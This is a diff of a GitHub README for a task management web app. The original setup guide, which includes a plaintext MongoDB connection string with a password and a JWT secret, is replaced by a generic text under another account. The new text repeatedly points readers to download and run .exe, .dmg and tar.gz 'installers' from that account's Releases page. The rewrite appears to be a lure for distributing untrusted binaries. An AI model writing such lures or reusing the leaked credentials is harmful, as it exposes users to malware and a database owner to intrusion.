@@ -1,157 +1,61 @@
-# 🚀 Task Management System
+# 🚀 task-management-system - Manage Your Tasks Easily
 
-A **full-stack Task Management System** built with `Node.js (Express, MongoDB, TypeScript)` for **backend** and `React + Vite Rudux, Typescript, Tailwind` for **frontend**.  
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Afriansyahlamato/task-management-system/releases)
 
+## 📖 Overview
+The task-management-system helps users create, update, and track tasks across projects. It provides a user-friendly interface to manage your tasks effectively. With this system, you can easily keep your projects organized and stay on top of your responsibilities, ensuring nothing slips through the cracks.
 
-#### Project Demo :point_down:
+## 🚀 Getting Started
+To begin using the task-management-system, follow these steps to download and run the application:
 
-[![Project Demo](./images/dashboard.png)](https://drive.google.com/file/d/1H4_-WgSx2j4cwH6Q0fN3DWlKb4dF84qh/view)
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Afriansyahlamato/task-management-system/releases) to find the latest version of the software.
 
+2. **Select the Latest Version:** On the releases page, look for the most recent version. This will usually have a version number like v1.0. Click on it to see the available files.
 
-👉 [Frontend Output UI](https://github.com/bappasahabapi/task-management-system/blob/main/fronted/Readme.md)
-👉 [Backend Swagger UI](https://github.com/bappasahabapi/task-management-system/blob/main/fronted/Readme.md)
+3. **Choose Your File:** Depending on your operating system, you will find different files available for download. Here are the common options:
+    - For **Windows**, look for a file ending in `.exe`.
+    - For **MacOS**, you should look for a file ending in `.dmg`.
+    - For **Linux**, download the file ending in `tar.gz`.
 
+4. **Download the File:** Click on the file name to begin the download. Your browser will save it to your default downloads folder.
 
-#### 🔥 Endpoints
+5. **Run the Installer:**
+    - **Windows Users:** Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete the setup.
+    - **MacOS Users:** Open the `.dmg` file, then drag the application to your Applications folder. After that, you can find it in your Applications.
+    - **Linux Users:** Use the terminal to extract the `.tar.gz` file using the command `tar -xvzf filename.tar.gz`, then navigate into the extracted folder and run the application using the included script.
 
-- `POST /auth/register` 
-    - { email, username, name, password }` -> `{ user, token }
-- `POST /auth/login` 
-    - { username, password }` -> `{ user, token }
-- `POST /projects`  (auth) 
-    - `{ name }`
-- `POST /tasks` (auth) 
-    - { id,projectId, title, description?, status?, priority?, due? }
-- `GET /projects` (auth)
-- `GET /tasks` (auth) query: `q,status,projectId,sort`
-- `GET /tasks/:id` (auth)
-- `PATCH /tasks/:id` (auth)
-- `DELETE /tasks/:id` (auth)
+## 🛠️ Features
+- **Task Creation:** Easily create new tasks with just a few clicks.
+- **Task Management:** Update and remove tasks as needed.
+- **Project Tracking:** Organize tasks by project for better visibility.
+- **User Authentication:** Secure your data with user login.
+- **Responsive Design:** Use the application on any device, from desktops to tablets.
 
----
+## 📄 System Requirements
+To run the task-management-system smoothly, ensure your device meets the following requirements:
 
+- **Windows:** Windows 10 or later.
+- **MacOS:** macOS Mojave (10.14) or later.
+- **Linux:** A recent version of your preferred Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** Minimum of 150MB free disk space.
 
-**🔄 Data Flow Architecture**
-```mermaid
-flowchart TD
-    Client[Frontend React App] -->|HTTP/REST| API[Express Server]
-    API -->|Routes| Controllers
-    Controllers -->|Business Logic| Models
-    Models -->|Queries| Database[(MongoDB)]
-    Database --> Models
-    Models --> Controllers
-    Controllers --> API
-    API --> Client
-```
+## ⭐ How to Use the Application
+1. **Log In/Sign Up:** When you first open the application, you will need to create an account or log in if you already have one.
+2. **Create Tasks:** After logging in, you can start adding tasks. Click the "Add Task" button and fill out the required information.
+3. **Manage Your Tasks:** View your tasks in the main dashboard. Use the options to update or delete tasks as necessary.
+4. **Track Your Progress:** Monitor the status of your tasks and ensure timely completion within your projects.
 
-This guide will help you set up and run the project locally.
+## 🌟 Support
+If you encounter any issues while using the task-management-system, check the [Issues section](https://github.com/Afriansyahlamato/task-management-system/issues) for solutions or to report problems. You can also find helpful information in the application’s documentation.
 
+## 📅 Future Plans
+- **Mobile Application:** Plans to develop a mobile version for both iOS and Android users.
+- **Enhanced Features:** Further improvements based on user feedback to enhance the task management experience.
 
-#### 🔥 Quickstart
+## 📦 Contributions
+Contributions to the task-management-system are welcome. If you want to improve the software, feel free to fork the repository and submit a pull request. Help us make task management even better!
 
-Clone the project :
-
-    git clone https://github.com/bappasahabapi/task-management-system.git
-
-Go to the project folder or open the project in vsc/terminal
-    
-    cd task-management-system
-
-Inside the task-management-system folder we have two folder. frontend , backend
-
----
-
-**🔲 Run backend**
-
-
-Go to the **backend folder** and then create the `.env` file in the inside the backend folder and paste the code from .env.example
-
-    cd backend
-  
-In the backend create  `.env` file and  paste the code
-```ts
-JWT_SECRET=dointechltd
-PORT=4000
-MONGO_URI=mongodb+srv://bappasaha161:bapibarija@cluster0.nnn0vgn.mongodb.net/doinTech?retryWrites=true&w=majority&appName=Cluster0
-
-```
-Then go to the terminal and paste these two comman
-```ts
-npm install
-npm run dev  // for run the server.
-
-```
-and you will see this output in the terminal
-
-```bash
-> tms-backend-bappa@1.0.0 dev
-> nodemon --watch src --ext ts --exec tsx src/server.ts
-
-[nodemon] 3.1.10
-[nodemon] to restart at any time, enter `rs`
-[nodemon] watching path(s): src/**/*
-[nodemon] watching extensions: ts
-[nodemon] starting `tsx src/server.ts`
-✅ Connected to MongoDB
-🚀 Doin Tech Server running on http://localhost:4000
-```
-
-**🔲 Run fronted**
-
-```bash
-# Go to the fronted folder and install the packages and then run the server
-
-cd frontend
-npm i
-npm run dev
-
-```
-
-and you will see this output in the terminal
-```bash
-VITE v5.4.20  ready in 383 ms
-
-  ➜  Local:   http://localhost:5173/
-  ➜  Network: use --host to expose
-  ➜  press h + enter to show help
-
-```
-
-
-
-#### 🔥 Requirement: [All features are implementd]
-
-✅  Backend (Node.js + Express): `implemented`
-
-- REST API for Task model: `(implementd)`
-    - **Fields**: title, description, status (Pending, In Progress, Completed),
-assignedUser, dueDate
-
-- Routes for Create, Read, Update, Delete. `(implemented)`
-
-
-✅ Authentication: `(implemented)`
-
-- Implement JWT-based login.
--  Only authenticated users can create/update tasks.
-
-✅ Bonus: `(implemented)`
-
-- Add search/filter tasks by status or due date.
-- Add API documentation with Swagger.
-
-
-👍 **Logic wise Extra things needed to be added for scale up the application**
-
-- Tasks are scoped to the logged-in user; only owners can view/update/delete.
-
----
-
-<!-- ### Step By Step executation for Backend:
-
-👉 [Step By Step executation:](https://github.com/bappasahabapi/task-management-system/blob/main/backend/Readme.md) 
-
-### Step By Step executation for Fronted:
-
-👉 [Step By Step executation:](https://github.com/bappasahabapi/task-management-system/blob/main/fronted/Readme.md)  -->
-
+## 📥 Download & Install
+To get started with task-management-system, visit the [Releases page](https://github.com/Afriansyahlamato/task-management-system/releases) today. Download the appropriate file for your device, and follow the installation instructions provided above. Enjoy your new task management tool with ease!
